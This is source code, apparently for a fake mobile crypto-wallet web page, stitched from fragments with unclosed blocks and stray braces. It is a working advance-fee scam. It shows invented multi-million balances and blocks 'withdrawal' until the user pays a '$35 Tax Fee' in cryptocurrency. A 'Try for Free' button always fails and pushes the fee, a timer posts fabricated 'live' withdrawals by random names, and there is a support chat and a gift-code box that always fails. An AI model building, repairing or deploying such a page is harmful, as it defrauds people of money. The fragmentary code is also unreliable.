<style>

*{
  box-sizing:border-box;
  font-family:-apple-system,BlinkMacSystemFont,"SF Pro Text","SF Pro Display","Segoe UI",Roboto,Helvetica,Arial;
}
:root{
  --bg:#f5f7fb;
  --card:#ffffff;
  --blue:#1e7cff;
  --blueSoft:#eaf2ff;
  --text:#0b1220;
  --muted:#6b7280;
  --green:#22c55e;
  --border:#e5e7eb;
}
body{
  margin:0;background:var(--bg);
  display:flex;justify-content:center;
}
.app{
  width:100%;max-width:420px;
  min-height:100vh;
  padding:16px 16px 90px;
}
.header{
  background:linear-gradient(135deg,#1e7cff,#4aa3ff);
  color:white;border-radius:20px;
  padding:20px;
}
.balance{
  font-size:30px;font-weight:800;margin-top:6px;
}
.card{
  background:var(--card);
  border-radius:18px;
  padding:16px;
  margin-top:16px;
  box-shadow:0 8px 24px rgba(0,0,0,.06);
}
.btn{
  width:100%;padding:14px;
  border-radius:14px;border:none;
  font-weight:700;cursor:pointer;
}
.btn.primary{background:var(--blue);color:white}
.btn.light{background:var(--blueSoft);color:var(--blue)}
.row{display:flex;gap:10px;margin-top:12px}
.muted{color:var(--muted);font-size:13px}
.list{
  display:flex;flex-direction:column;gap:12px;
}
.tx{
  background:white;border-radius:14px;
  padding:14px;border:1px solid var(--border);
}
.tx strong{font-size:14px}
.tx .muted{margin-top:4px}

/* Bottom Nav */
.nav{
  position:fixed;bottom:0;left:50%;
  transform:translateX(-50%);
  width:100%;max-width:420px;
  background:white;border-top:1px solid var(--border);
  display:flex;
}
.nav button{
  flex:1;padding:14px 0;
  background:none;border:none;
  font-weight:700;color:var(--muted);
}
.nav button.active{color:var(--blue)}

/* Modal */
.overlay{
  position:fixed;inset:0;
  background:rgba(0,0,0,.45);
  display:none;align-items:flex-end;justify-content:center;
  z-index:999;
}
.overlay.show{display:flex}
.sheet{
  width:100%;max-width:420px;
  background:white;
  border-radius:22px 22px 0 0;
  padding:18px;
  animation:up .35s cubic-bezier(.22,1,.36,1);
}
@keyframes up{
  from{transform:translateY(100%)}
  to{transform:translateY(0)}
}
input,select{
  width:100%;padding:12px;
  border-radius:12px;border:1px solid var(--border);
  margin-top:8px;font-size:15px;
}
.loader{
  width:38px;height:38px;
  border:4px solid var(--border);
  border-top-color:var(--blue);
  border-radius:50%;
  animation:spin 1s linear infinite;
  margin:24px auto;
}
@keyframes spin{to{transform:rotate(360deg)}}
.success{
  display:flex;justify-content:center;margin:24px 0;
}
.tick{
  width:90px;height:90px;
  background:var(--green);
  color:white;border-radius:50%;
  display:flex;align-items:center;
  justify-content:center;
  font-size:46px;font-weight:900;
  animation:pop .4s ease-out;
}
@keyframes pop{
  0%{transform:scale(0)}
  70%{transform:scale(1.2)}
  100%{transform:scale(1)}
}
.center{text-align:center}
.hidden{display:none}

.nav{
  position:fixed;
  bottom:0;
  left:50%;
  transform:translateX(-50%);
  width:100%;
  max-width:420px;
  height:76px;
  background:#ffffff;
  border-top:1px solid #e5e7eb;
  display:flex;
  z-index:9999;
  box-shadow:0 -8px 24px rgba(0,0,0,.08);
}

.nav-btn{
  flex:1;
  background:none;
  border:none;
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:center;
  gap:5px;
  color:#9ca3af;
  font-size:12px;
  font-weight:600;
  cursor:pointer;
  position:relative;
  transition:all .25s ease;
}

.nav-btn svg{
  width:26px;
  height:26px;
}

/* ACTIVE STATE */
.nav-btn.active{
  color:#1e7cff;
}

.nav-btn.active::before{
  content:"";
  position:absolute;
  top:0;
  width:42px;
  height:4px;
  background:#1e7cff;
  border-radius:0 0 10px 10px;
}


.nav-btn:active{
  transform:scale(.94);
}


@supports (padding-bottom: env(safe-area-inset-bottom)){
  .nav{
    padding-bottom:env(safe-area-inset-bottom);
    height:calc(76px + env(safe-area-inset-bottom));

<script>
const S={
  bal:'tw_bal',
  tx:'tw_tx',
  names:'tw_names'
};
const balEl=document.getElementById('bal');
const recentTx=document.getElementById('recentTx');
const txList=document.getElementById('txList');


const savedBal=localStorage.getItem(S.bal);
if(savedBal) balEl.textContent=savedBal;
renderTx();


function randomName(){
  const first=["Alex","Ryan","Daniel","Chris","Michael","Jordan","Kevin","David","Liam","Noah"];
  const last=["Khan","Smith","Brown","Lee","Patel","Garcia","Nguyen","Ahmed","Kim","Silva"];
  let used=JSON.parse(localStorage.getItem(S.names)||"[]");
  let name;
  do{
    name=first[Math.floor(Math.random()*first.length)]+" "+
         last[Math.floor(Math.random()*last.length)];
  }while(used.includes(name));
  used.push(name);
  localStorage.setItem(S.names,JSON.stringify(used));
  return name;
}


function addTx(text){
  const txs=JSON.parse(localStorage.getItem(S.tx)||"[]");
  const t=new Date();
  const item={
    id:Date.now(),
    name:randomName(),
    text,
    time:t.toLocaleString()
  };
  txs.unshift(item);
  localStorage.setItem(S.tx,JSON.stringify(txs));
  renderTx();
}


function renderTx(){
  const txs=JSON.parse(localStorage.getItem(S.tx)||"[]");
  txList.innerHTML=""; // user tx only

  if(txs.length){
    recentTx.textContent=txs[0].text+" ‚Ä¢ "+txs[0].time;
  }
  txs.forEach(t=>{
    const d=document.createElement('div');
    d.className="tx";
    d.innerHTML=`
      <strong>${t.name}</strong>
      <div class="muted">${t.text}</div>
      <div class="muted">${t.time}</div>
    `;
    txList.appendChild(d);
  });
}


gen.onclick=()=>{
  let c=5;
  const i=setInterval(()=>{
    balEl.textContent=c;
    c--;
    if(c<0){
      clearInterval(i);
      const v=Math.floor(Math.random()*(20000000-300000)+300000);
      const f="$"+v.toLocaleString();
      balEl.textContent=f;
      localStorage.setItem(S.bal,f);
    }
  },600);
};


navWallet.onclick=()=>{
  walletView.classList.remove('hidden');
  txView.classList.add('hidden');
  navWallet.classList.add('active');
  navTx.classList.remove('active');
};
navTx.onclick=()=>{
  walletView.classList.add('hidden');
  txView.classList.remove('hidden');
  navTx.classList.add('active');
  navWallet.classList.remove('active');
};


withdrawBtn.onclick=()=>withdrawModal.classList.add('show');
document.querySelectorAll('.sheet').forEach(s=>s.onclick=e=>e.stopPropagation());
document.querySelectorAll('.overlay').forEach(o=>o.onclick=()=>o.classList.remove('show'));


wSubmit.onclick=()=>{
  const m=wMethod.value;
  withdrawModal.classList.remove('show');
  payModal.classList.add('show');
  payBox.innerHTML=`<div class="loader"></div><p class="muted">Processing‚Ä¶</p>`;
  setTimeout(()=>{
    payBox.innerHTML=`
      <p><strong>High Traffic</strong></p>
      <p class="muted">Pay $35 Tax Fee to proceed quickly</p>
      <button class="btn primary" id="payFee">Pay $35</button>
    `;
    payFee.onclick=()=>{
      addTx(``);
      depositFlow(m);
    };
  },1200);
};

function depositFlow(m){
  const addr="T"+Math.random().toString(36).slice(2,34);
  payBox.innerHTML=`
    <select>
      <option>USDT TRC20</option>
      <option>USDT BEP20</option>
      <option>Binance Pay</option>
      <option>DOGE</option>
      <option>TRX</option>
    </select>
    <input placeholder="Amount">
    <button class="btn primary" id="payNow">Pay</button>
  `;
  payNow.onclick=()=>{
    payBox.innerHTML=`<div class="loader"></div>`;
    setTimeout(()=>{
      payBox.innerHTML=`
        <strong>${addr}</strong><br><br>
        <img src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${addr}">
        <input placeholder="Transaction Hash">
        <button class="btn primary" id="verify">Verify</button>
      `;
      verify.onclick=()=>{
        payBox.innerHTML=`<div class="loader"></div>`;
        setTimeout(()=>{
          payBox.innerHTML=`
            <div class="success"><div class="tick">‚úì</div></div>
            <p class="muted">
              Your withdrawal using ${m} has been processed
            </p>
          `;
          addTx(`Successfully withdrew using ${m}`);
        },1200);
      };
    },1000);
  };
}

function liveUserName(){
  const f=["Alex","Ryan","Daniel","Chris","Michael","Jordan","Kevin","David","Liam","Noah"];
  const l=["Khan","Smith","Brown","Lee","Patel","Garcia","Nguyen","Ahmed","Kim","Silva"];
  return f[Math.random()*f.length|0]+" "+l[Math.random()*l.length|0];
}


function liveTxText(){
  const nets=["USDT TRC20","USDT BEP20","Binance Pay","TRX","DOGE"];
  const n=nets[Math.random()*nets.length|0];
  return Math.random()>0.5
    ? `Successfully withdrew $${(Math.random()*900000+100000|0).toLocaleString()} via ${n}`
    : `Paid $35 fee successfully using ${n}`;
}


function pushLiveTx(){

  if(txView.classList.contains("hidden")) return;

  const tx=document.createElement("div");
  tx.className="tx";
  tx.innerHTML=`
    <strong>${liveUserName()}</strong>
    <div class="muted">${liveTxText()}</div>
    <div class="muted">${new Date().toLocaleTimeString()}</div>
  `;

  txList.prepend(tx);


  txList.scrollTop=0;


  if(txList.children.length>30){
    txList.removeChild(txList.lastChild);
  }
}


setInterval(pushLiveTx, 3500);

</script>

  from{transform:translate(-50%,-30px);opacity:0}
  to{transform:translate(-50%,0);opacity:1}
}`;
document.head.appendChild(s);

function hasBalance(){
  const el=document.getElementById("bal");
  if(!el) return false;
  const n=el.textContent.replace(/[^0-9]/g,"");
  return n && Number(n)>0;
}

function hookWithdraw(){
  if(typeof wSubmit==="undefined") return setTimeout(hookWithdraw,200);

  const original=wSubmit.onclick;

  wSubmit.onclick=function(){
    if(!hasBalance()){
      premiumNotice("Please generate balance first");
      return; // ‚ùå stop flow
    }
    if(typeof original==="function") original(); // ‚úÖ continue original logic
  };
}

hookWithdraw();

})();
</script>
<script>

(function(){

function getBalance(){
  const el = document.getElementById("bal");
  if(!el) return 0;
  return Number(el.textContent.replace(/[^0-9]/g,"")) || 0;
}

function setBalance(n){
  const el = document.getElementById("bal");
  if(!el) return;
  const v = "$" + n.toLocaleString();
  el.textContent = v;
  localStorage.setItem("tw_bal", v);
}

function getWithdrawAmount(){
  const amtInput = document.querySelector(
    "#withdrawModal input[placeholder='Amount']"
  );
  if(!amtInput) return 0;
  return Number(amtInput.value.replace(/[^0-9]/g,"")) || 0;
}


const observer = new MutationObserver(() => {
  const successText = document.querySelector("#payBox p.muted");

  if(
    successText &&
    successText.textContent.includes("has been processed") &&
    !successText.dataset.deducted
  ){
    successText.dataset.deducted = "1"; 

    const bal = getBalance();
    const amt = getWithdrawAmount();

    if(amt > 0 && bal >= amt){
      setBalance(bal - amt);
    }
  }
});

observer.observe(document.body, {
  childList: true,
  subtree: true
});

})();
</script>

const KEY="tw_try_free_count";
const LIMIT=16;


function premiumPopup(title,msg,opts={}){
  const p=document.createElement("div");
  p.className="twPremiumPop center";
  p.innerHTML=`
    <div class="twPopClose">‚úï</div>
    <div style="font-size:13px;opacity:.75">${title}</div>
    <div style="margin-top:6px;font-size:15px;font-weight:600;line-height:1.45">
      ${msg}
    </div>
  `;
  document.body.appendChild(p);

  p.querySelector(".twPopClose").onclick=()=>p.remove();
  setTimeout(()=>p.remove(),opts.time||5000);
}


const hook=setInterval(()=>{
  const payBtn=document.getElementById("payFee");
  if(!payBtn) return;

  clearInterval(hook);
  if(document.getElementById("twTryFree")) return;

  const tryBtn=document.createElement("button");
  tryBtn.id="twTryFree";
  tryBtn.className="twTryBtn";
  tryBtn.textContent="Try for Free";

  payBtn.after(tryBtn);

  tryBtn.onclick=()=>{
    let c=Number(localStorage.getItem(KEY)||0);


    if(c >= LIMIT){
      tryBtn.disabled=true;
      tryBtn.textContent="Try for Free Disabled";

      payBtn.classList.add("payHighlight");

      premiumPopup(
        "Limit Reached",
        "Free attempts exhausted. Please proceed by paying <b>$35 fee</b> to continue securely.",
        {time:10000}
      );
      return;
    }

    c++;
    localStorage.setItem(KEY,c);


    if(c % 4 === 0){
      let time=15;
      tryBtn.disabled=true;
      tryBtn.textContent=`Please wait ${time}s`;

      const t=setInterval(()=>{
        time--;
        tryBtn.textContent=`Please wait ${time}s`;
        if(time<=0){
          clearInterval(t);
          tryBtn.disabled=false;
          tryBtn.textContent="Try for Free";

          premiumPopup(
            "High Traffic Detected",
            "We noticed too much traffic on our site. "+
            "Proceed by paying <b>$35 fee</b> for instant processing.",
            {time:10000}
          );
        }
      },1000);
      return;
    }


    premiumPopup(
      "Network Busy",
      "Please try again in a moment.",
      {time:10000}
    );
  };

},200);

})();
</script>

<script>

(function(){

function getBalance(){
  return Number(localStorage.getItem("tw_main_balance") || 0);
}

function setBalance(v){
  localStorage.setItem("tw_main_balance", v);
  const el=document.getElementById("mainBalance");
  if(el) el.textContent = v.toLocaleString();
}


const observer=new MutationObserver(()=>{
  const successText=document.body.innerText;
  if(!successText.includes("has been processed")) return;

  observer.disconnect(); 

  let amount=0;

 
  if(window.currentWithdrawAmount){
    amount=Number(window.currentWithdrawAmount);
  }

  
  if(!amount){
    const inp=document.getElementById("withdrawAmount");
    if(inp) amount=Number(inp.value);
  }

  if(!amount || isNaN(amount)) return;

  const bal=getBalance();
  const newBal=Math.max(0, bal-amount);
  setBalance(newBal);
});

observer.observe(document.body,{
  childList:true,
  subtree:true
});

})();
</script>

function renderMsg(m,id){
  if(id && document.querySelector(`[data-id="${id}"]`)) return;
  const d=document.createElement("div");
  d.className="msg "+(m.from==="user"?"user":"admin");
  if(id) d.dataset.id=id;

  if(m.img) d.innerHTML+=`<img src="${m.img}">`;
  supportMessages.appendChild(d);
  supportMessages.scrollTop=supportMessages.scrollHeight;
}


function attachChatListeners(){


  db.ref("chats/"+chatId()).on("child_added",snap=>{
    const m=snap.val();
    renderMsg(m,snap.key);

    if(m.from==="admin"){
      db.ref("chats/"+chatId()+"/"+snap.key+"/read").set(true);
      msgSound.play();

  });


  db.ref("chats/"+chatId()).on("child_removed",snap=>{
    const el=document.querySelector(`[data-id="${snap.key}"]`);
    if(el) el.remove();
  });


  db.ref("chats/"+chatId()).on("value",snap=>{
    if(!snap.exists()){
      supportMessages.innerHTML="";
      chatScreen.style.display="none";
      startChat.style.display="flex";
    }
  });
}

      const box=o.querySelector(".twGiftBox");
      box.innerHTML=`<div class="loader"></div>`;

      setTimeout(()=>{
        box.innerHTML=`
          <div class="twFail">!</div>
          <p style="
            text-align:center;
            color:#dc2626;
            font-weight:700;
            font-size:15px
          ">
            Gift code expired or invalid
          </p>
        `;
      },1200);
    };
  };
},200);

})();
</script>
